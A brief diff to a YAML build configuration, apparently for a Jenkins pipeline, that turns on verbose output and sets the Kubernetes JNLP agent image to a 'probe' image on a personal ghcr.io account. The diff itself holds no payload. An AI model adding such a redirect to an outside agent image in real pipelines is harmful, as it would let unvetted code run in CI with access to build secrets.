@@ -1,2 +1,5 @@
 general:
   buildTool: 'mta'
+  verbose: true
+  jenkinsKubernetes:
+    jnlpAgent: 'ghcr.io/waterlord7788/kp-nonexistent-jnlp-7788:probe'
